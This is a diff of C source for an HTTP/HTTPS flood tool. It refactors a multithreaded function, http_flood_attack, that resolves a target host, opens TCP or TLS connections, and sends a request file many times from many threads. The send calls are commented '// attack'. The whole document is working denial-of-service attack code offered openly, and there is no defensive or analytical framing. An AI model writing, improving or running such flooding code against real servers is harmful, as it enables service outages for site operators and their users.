@@ -20,6 +20,50 @@ extern void info(const char *fmt, ...);
 extern void warning(const char *fmt, ...);
 extern void error(const char *fmt, ...);
 
+static char *_read_file(const char *path)
+{
+    if (strlen(path) == 0)
+        error("please set request file path");
+
+    int cursor = 0;
+    char ch;
+    // char ch_cr = '\r';
+    // char ch_lf = '\n';
+    // ASCII
+    unsigned int ch_lf = 10;
+    unsigned int ch_cr = 13;
+
+    FILE *fp = fopen(path, "r");
+    if (!fp)
+        error(strerror((errno)));
+
+    fseek(fp, 0L, SEEK_END);
+    long sz = ftell(fp); // file size
+    rewind(fp);
+
+    char *buff = (char *)calloc(sz * 2, sizeof(char));
+    while (1)
+    {
+        ch = fgetc(fp);
+        if (ch == EOF)
+            break;
+        else if ((unsigned int)ch != 10 && (unsigned int)ch != 13)
+            buff[cursor++] = ch;
+        else
+        {
+            buff[cursor++] = ch_cr;
+            buff[cursor++] = ch_lf;
+        }
+    }
+    fclose(fp);
+    buff[cursor++] = ch_cr;
+    buff[cursor++] = ch_lf;
+    buff[cursor++] = ch_cr;
+    buff[cursor++] = ch_lf;
+
+    return buff;
+}
+
 #ifdef DEBUG
 static int _show_certs(SSL *ssl)
 {
@@ -46,36 +90,28 @@ static int _show_certs(SSL *ssl)
 }
 #endif
 
-static pIPLIST _get_ip(const char *host)
+static char **_get_ip(const char *host)
 {
     int i;
     struct hostent *he;
-    pIPLIST iplist = (pIPLIST)malloc(sizeof(IPLIST));
-    iplist->ip = NULL;
-    iplist->next = NULL;
-    pIPLIST p = iplist;
 
     he = gethostbyname(host);
     if (!he)
         error(strerror(errno));
-
-    // for(i = 0; ho->h_aliases[i]; i++){
-    //     printf("Aliases %d: %s\n", i + 1, ho->h_aliases[i]);
-    // }
 
     // AF_INET
     // AF_INET6
     if (he->h_addrtype == AF_INET6)
         error("IPv6 is not supported!");
 
+    char **iplist = (char **)calloc(he->h_length, sizeof(char *));
     // IP
     for (i = 0; he->h_addr_list[i]; i++)
     {
-        p->ip = inet_ntoa(*((struct in_addr *)he->h_addr_list[i]));
-        p->next = (pIPLIST)malloc(sizeof(IPLIST));
-        p = p->next;
-        p->next = NULL;
-        p->ip = NULL;
+        iplist[i] = inet_ntoa(*((struct in_addr *)he->h_addr_list[i]));
+#ifdef DEBUG
+        printf("Aliases [%d][%s]: %s\n", i, he->h_aliases[i], iplist[i]);
+#endif
     }
 
     return iplist;
@@ -136,7 +172,7 @@ static int _send(const int sock, const char *request, SSL *ssl)
         {
             ret = send(sock, request + sent_size, (request_size - sent_size), 0);
             if (ret < 0)
-                error(strerror(errno));
+                warning(strerror(errno));
             sent_size += ret;
         }
     }
@@ -156,10 +192,9 @@ static int _recv(const int socket, char **response, SSL *ssl)
     // http recv function
     // there has some different between tcp and http recv function
 
-    unsigned long buff_size = 4096;
+    int buff_size = 4096;
     int ret = 0;
-    char *buff = (char *)malloc(buff_size);
-    memset(buff, 0, buff_size);
+    char *buff = (char *)calloc(buff_size, sizeof(char));
 
     if (!ssl) // http
     {
@@ -190,68 +225,49 @@ static int _recv(const int socket, char **response, SSL *ssl)
 }
 #endif
 
-static int _http(const char *address, const int port, const char *request)
+static int _connect_socket(char **iplist, const int port)
 {
-    if (!strlen(address) || !strlen(request))
-        error("url or request can not be null!");
-
     int sock = -1;
-    pIPLIST iplist = _get_ip(address);
-    pIPLIST p = iplist;
+    int i = 0;
     while (sock < 0)
     {
-        sock = _tcp_create_socket(p->ip, port);
-        if (sock < 0)
-            warning("%s can not connect", p->ip);
-        else
-            info("%s connected", p->ip);
-
-        if (p->next)
-            p = p->next;
-        else
+        if (!iplist[i])
             error("no ip can connect");
+
+        sock = _tcp_create_socket(iplist[i], port);
+        // info("%s connected", iplist[i++]);
+        if (sock < 0)
+            warning("%s can not connect", iplist[i++]);
     }
+
+    return sock;
+}
+
+static int _http(char **iplist, const int port, const char *request)
+{
+    int sock = _connect_socket(iplist, port);
 
 #ifdef DEBUG
     _send(sock, request, NULL);
     char *response;
-    _recv(sock, &response, NULL); // for test
+    _recv(sock, &response, NULL);
     warning("HTTP response:");
     printf("%s\n", response);
     free(response);
 #else
-    // while (1) // this code can not run normally in thread
-    for (int i = 0; i < 128; i++) // if i = 256, the program will exit with unknow reason
-        _send(sock, request, NULL); // attack
+    _send(sock, request, NULL); // attack
 #endif
 
     close(sock);
+
     return 0;
 }
 
-static int _https(const char *address, const int port, const char *request)
+static int _https(char **iplist, const int port, const char *request)
 {
 
-    if (!strlen(address) || !strlen(request))
-        error("url or request can not be null!");
-
     // 1 create socket
-    int sock = -1;
-    pIPLIST iplist = _get_ip(address);
-    pIPLIST p = iplist;
-    while (sock < 0)
-    {
-        sock = _tcp_create_socket(p->ip, port);
-        if (sock < 0)
-            warning("%s can not connect", p->ip);
-        else
-            info("%s connected", p->ip);
-
-        if (p->next)
-            p = p->next;
-        else
-            error("no ip can connect");
-    }
+    int sock = _connect_socket(iplist, port);
 
     // 2 ssl init
     SSL_CTX *ctx;
@@ -290,159 +306,97 @@ static int _https(const char *address, const int port, const char *request)
     printf("%s\n", response);
     free(response);
 #else
-    while(1)
-        _send(sock, request, ssl); // attack
+    _send(sock, request, ssl);
 #endif
 
     // 6 close
     close(sock);
     SSL_CTX_free(ctx);
+    SSL_free(ssl);
     return 0;
 }
-
-static int _read_file(const char *path, char **config)
-{
-    int max_buff_size = 4096;
-    int cursor = 0;
-    char ch;
-    char chs1 = '\r';
-    char chs2 = '\n';
-    char *buff = (char *)malloc(max_buff_size);
-    memset(buff, 0, max_buff_size);
-    FILE *fp = fopen(path, "r");
-    if (!fp)
-        error(strerror(errno));
-
-    while (1)
-    {
-        ch = fgetc(fp);
-        if (ch == EOF)
-            break;
-        else if (ch != '\n')
-            buff[cursor++] = ch;
-        else
-        {
-            buff[cursor++] = chs1;
-            buff[cursor++] = chs2;
-        }
-    }
-    fclose(fp);
-    buff[cursor++] = chs1;
-    buff[cursor++] = chs2;
-
-    (*config) = buff;
-    return 0;
-}
-
-/*
-static int _read_file(const char *path, char **data)
-{
-    int max_buff_size = 4096;
-    char *buff = (char *)malloc(max_buff_size);
-    memset(buff, 0, max_buff_size);
-    FILE *fp = fopen(path, "r");
-    if (!fp)
-        error(strerror(errno));
-
-    fread(buff, sizeof(char), max_buff_size, fp);
-    if (ferror(fp) != 0)
-        error(strerror(errno));
-
-    fclose(fp);
-    (*data) = buff;
-    // printf("%s\n", buff);
-    return 0;
-}
-*/
 
 static void _attack_thread(pHFTP parameters)
 {
-    char *request;
-    _read_file(parameters->http_request_file_path, &request);
+    char *request = parameters->request;
+    char *content = _read_file(request);
+    char *url = parameters->url;
+    int port = parameters->port;
+    int https = parameters->https;
+    char **iplist = _get_ip(url);
 
-    if (parameters->http_or_https == 0)
-        while (1)
-        {
-            _http(parameters->url, parameters->port, request); // attack
-        }
-    else if (parameters->http_or_https == 1)
-        while (1)
-            _https(parameters->url, parameters->port, request);
+#ifdef DEBUG
+    warning("thread start...");
+    if (https == HTTP)
+    {
+        warning("sending http content...");
+        _http(iplist, port, content);
+    }
+    else
+    {
+        warning("sending https content...");
+        _https(iplist, port, content);
+    }
+#else
+    unsigned int pn = parameters->pn;
+    if (https == HTTP)
+        for (unsigned int i = 1; i != pn; i++)
+            _http(iplist, port, content); // attack
 
-    free(request);
+    else if (https == HTTPS)
+        for (unsigned int i = 1; i != pn; i++)
+            _https(iplist, port, content);
+#endif
+
+    free(content);
+    free(iplist);
 }
 
 int http_flood_attack(char *url, int port, ...)
 {
     va_list vlist;
     va_start(vlist, port);
-    char *http_content = va_arg(vlist, char *);
-    char *https_content = va_arg(vlist, char *);
+    char *request = va_arg(vlist, char *);
+    int https = va_arg(vlist, int);
     int thread_number = va_arg(vlist, int);
+    unsigned int pn = va_arg(vlist, int);
     va_end(vlist);
 
     // http == 0
     // https == 1
-    int http_or_https = -1;
-    if (strlen(http_content))
-        http_or_https = 0;
-    else if (strlen(https_content))
-        http_or_https = 1;
 
     pHFTP parameters = (pHFTP)malloc(sizeof(HFTP));
     parameters->url = url;
     parameters->port = port;
-    parameters->http_request_file_path = http_content;
-    parameters->http_or_https = http_or_https;
+    parameters->request = request;
+    parameters->https = https;
+    parameters->pn = pn;
 
-#ifndef DEBUG
     pthread_t tid_list[thread_number];
     pthread_attr_t attr;
     int ret, i;
-#endif
 
-    if (strlen(url))
-    {
-        if (strstr(url, "http"))
-        {
-            error("please use such '192.168.1.1' or 'www.google.com' address format");
-        }
-    }
     if (port == 0)
-    {
         error("please specify a target port");
-    }
 
-#ifdef DEBUG
-    thread_number++; // meaningless operation, just to avoid warnings from gcc compilation
-    _attack_thread(parameters); // test
-#else
     for (i = 0; i < thread_number; i++)
     {
         if (pthread_attr_init(&attr))
-        {
             error(strerror(errno));
-        }
         // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
         if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
-        {
             error(strerror(errno));
-        }
         // create thread
         ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
         if (ret != 0)
-        {
             error("create pthread failed, ret: %d, %s", ret, strerror(errno));
-        }
         pthread_attr_destroy(&attr);
     }
     // pthread_detach(tid);
     // join them all
     for (i = 0; i < thread_number; i++)
-    {
         pthread_join(tid_list[i], NULL);
-    }
-#endif
 
+    free(parameters);
     return 0;
 }
